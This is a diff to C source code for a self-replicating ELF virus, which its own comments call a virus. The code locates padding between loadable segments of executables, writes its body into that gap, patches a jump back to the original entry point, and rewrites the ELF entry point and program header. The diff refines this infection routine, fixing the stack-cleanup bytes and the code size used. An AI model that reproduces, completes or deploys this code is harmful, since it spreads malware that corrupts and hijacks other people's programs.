@@ -3,6 +3,7 @@
  *
  * Copyright: Robin Hack <hack.robin@gmail.com>
  */
+
 #define SYS_READ	0
 #define SYS_WRITE	1
 #define SYS_OPEN	2
@@ -127,19 +128,36 @@ void _start(void)
 	volatile Elf64_Phdr phdr;
 	volatile Elf64_Phdr phdr_next;
 	unsigned long offset;
-	unsigned long code_size;
 	unsigned long real_code_size;
 	Elf64_Half p;
 	unsigned char jmp[19];
 
 	/* Count size of _start function of virus */
 	real_code_size = (long)&&label2 - (long)&_start;
-	code_size = 2048;
 	a[0] = 'a';
 	a[1] = 'a';
 	a[2] = 'a';
 	a[3] = 'a';
 	a[4] = '\0';
+
+	/* change code */
+	/* movabs old_entry_point, %rax
+	 * add $0x2f8, %rsp
+	 * jmpq *%rax
+	 */
+	jmp[0] = '\x48';
+	jmp[1] = '\xb8';
+
+	jmp[10] = '\x48';
+	jmp[11] = '\x81';
+	jmp[12] = '\xc4';
+	jmp[13] = '\xe8';
+	jmp[14] = '\x02';
+	jmp[15] = '\x00';
+	jmp[16] = '\x00';
+
+	jmp[17] = '\xff';
+	jmp[18] = '\xe0';
 
 	/* loop: for all elf files in /home/user/bin */
 	volatile long fd = open(a, O_RDWR, 0);
@@ -154,62 +172,43 @@ void _start(void)
 	    || ehdr.e_type != ET_EXEC)
 	{
 		close(fd);
-		_exit(5);
+		goto label2;
 	}
 
 	lseek(fd, ehdr.e_phoff, SEEK_SET);
-	for (p = 0; p < ehdr.e_phnum; ++p) {
+	for (p = 0; p < (ehdr.e_phnum - 1); ++p) {
 		read(fd, &phdr, sizeof(phdr));
 		if (phdr.p_type != PT_LOAD) { continue; }
 		read(fd, &phdr_next, sizeof(phdr_next));
 
-		if (((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz)) >= real_code_size)) {
-			/* Padding in victim */
-			offset = phdr.p_offset + phdr.p_filesz;
-			lseek(fd, offset, SEEK_SET);
-			/* add code */
-			write(fd, (long)_start, real_code_size);
+		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz)) < real_code_size) { continue; }
 
-			/* change code */
-			/* movabs old_entry_point, %rax
-			 * add $0x2f8, %rsp
-			 * jmpq *%rax
-			 */
-			jmp[0] = '\x48';
-			jmp[1] = '\xb8';
+		/* Padding in victim */
+		offset = phdr.p_offset + phdr.p_filesz;
+		lseek(fd, offset, SEEK_SET);
+		/* add code */
+		write(fd, (long)_start, real_code_size);
 
-			jmp[10] = '\x48';
-			jmp[11] = '\x81';
-			jmp[12] = '\xc4';
-			jmp[13] = '\x08';
-			jmp[14] = '\x03';
-			jmp[15] = '\x00';
-			jmp[16] = '\x00';
 
-			jmp[17] = '\xff';
-			jmp[18] = '\xe0';
+		/* some instructions after label2 are not copyed
+		 * so I use this space to add jump... and stack cleanup
+		 */
+		_memcpy((long)&(ehdr.e_entry), (long)&(jmp[2]), 8); 
+		write(fd, jmp, sizeof(jmp));
 
-			/* some instructions after label2 are not copyed
-			 * so I use this space to add jump...
-			 * as a side effect it generates jump inside
-			 * instruction so it mess gdb :) */
-			_memcpy((long)&(ehdr.e_entry), (long)&(jmp[2]), 8); 
-			write(fd, jmp, sizeof(jmp));
+		/* change elf header entry point */
+		ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz;
+		lseek(fd, 0, SEEK_SET);
+		write(fd, &ehdr, sizeof(ehdr));
 
-			/* change elf header entry point */
-			ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz;
-			lseek(fd, 0, SEEK_SET);
-			write(fd, &ehdr, sizeof(ehdr));
-
-			/* change phdr */
-			phdr.p_filesz += code_size;
-			phdr.p_memsz += code_size;
-			lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
-			write(fd, &phdr, sizeof(phdr));
-			break;
-		}
+		/* change phdr */
+		phdr.p_filesz += real_code_size;
+		phdr.p_memsz += real_code_size;
+		lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
+		write(fd, &phdr, sizeof(phdr));
+		break;
 	}	
 	close(fd);
-	_exit(0);
 label2: ;
+	_exit(0);
 }
